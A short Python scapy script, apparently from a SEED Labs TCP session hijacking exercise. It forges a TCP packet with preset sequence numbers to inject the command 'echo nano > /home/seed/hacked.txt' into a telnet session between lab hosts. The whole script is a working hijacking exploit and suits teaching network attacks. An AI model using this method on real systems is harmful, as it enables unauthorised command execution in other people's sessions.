#!/usr/bin/env python3
from scapy.all import *

data = "echo nano > /home/seed/hacked.txt \r\n"
ip = IP(src="10.9.0.6", dst="10.9.0.5")
tcp = TCP(sport=46420, dport=23, flags="A", seq=2504937724, ack=24244889)

pkt = ip/tcp/data
ls(pkt)
send(pkt,verbose=0)